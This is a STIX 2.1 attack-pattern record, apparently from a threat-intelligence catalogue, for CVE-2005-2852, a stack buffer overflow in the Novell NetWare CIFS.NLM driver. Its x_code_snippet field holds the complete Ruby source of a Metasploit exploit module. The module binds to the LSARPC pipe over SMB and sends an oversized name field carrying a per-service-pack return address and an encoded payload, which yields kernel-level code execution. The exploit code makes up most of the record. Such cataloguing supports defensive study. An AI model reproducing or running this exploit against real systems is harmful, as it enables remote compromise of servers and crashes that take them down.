{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5fda6cb5-0fcf-48f8-be94-ddd34f5d458e",
    "created": "2024-08-14T16:34:02.247947Z",
    "modified": "2024-08-14T16:34:02.24795Z",
    "name": "Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the NetWare CIFS.NLM driver. Since the driver runs in the kernel space, a failed exploit attempt can cause the OS to reboot. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/netware/smb/lsass_cifs.rb",
            "external_id": "lsass_cifs.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2852"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in the NetWare CIFS.NLM driver.\n        Since the driver runs in the kernel space, a failed exploit attempt can\n        cause the OS to reboot.\n      },\n      'Author'         =>\n        [\n          'toto',\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-2852' ],\n          [ 'OSVDB', '12790' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'netware',\n      'Targets'        =>\n        [\n          # NetWare SP can be found in the SNMP version :\n          # 5.70.07 -> NetWare 6.5 (5.70) SP7 (07)\n\n          [ 'VMware',   { 'Ret' => 0x000f142b } ],\n          [ 'NetWare 6.5 SP2', { 'Ret' => 0xb2329b98 } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP3', { 'Ret' => 0xb234a268 } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP4', { 'Ret' => 0xbabc286c } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP5', { 'Ret' => 0xbabc9c3c } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP6', { 'Ret' => 0x823c835c } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP7', { 'Ret' => 0x823c83fc } ], # push esp - ret (libc.nlm)\n        ],\n\n      'DisclosureDate' => '2007-01-21'))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use (LSARPC)\", 'lsarpc'])\n      ])\n\n  end\n\n  def exploit\n\n    # Force multi-bind off (netware doesn't support it)\n    datastore['DCERPC::fake_bind_multi'] = false\n\n    connect()\n    smb_login()\n\n    handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"])\n\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    stb =\n      NDR.long(rand(0xffffffff)) +\n      NDR.UnicodeConformantVaryingString(\"\\\\\\\\#{datastore['RHOST']}\") +\n      NDR.long(0) +\n      NDR.long(0) +\n      NDR.long(0) +\n      NDR.long(0) +\n      NDR.long(0) +\n      NDR.long(0) +\n      NDR.long(0x000f0fff)\n\n    resp = dcerpc.call(0x2c, stb)\n    handle, = resp[0,20]\n    code, = resp[20, 4].unpack('V')\n\n    name =\n      rand_text_alphanumeric(0xa0) +\n      [target.ret].pack('V') +\n      payload.encoded\n\n    stb =\n      handle +\n      NDR.long(1) +\n      NDR.long(1) +\n\n      NDR.short(name.length) +\n      NDR.short(name.length) +\n      NDR.long(rand(0xffffffff)) +\n\n      NDR.UnicodeConformantVaryingStringPreBuilt(name) +\n\n      NDR.long(0) +\n      NDR.long(0) +\n      NDR.long(1) +\n      NDR.long(0)\n\n    print_status(\"Calling the vulnerable function ...\")\n\n    begin\n      dcerpc.call(0x0E, stb)\n    rescue\n    end\n\n    # Cleanup\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-01-21",
    "x_mitre_platforms": [
        "netware'"
    ]
}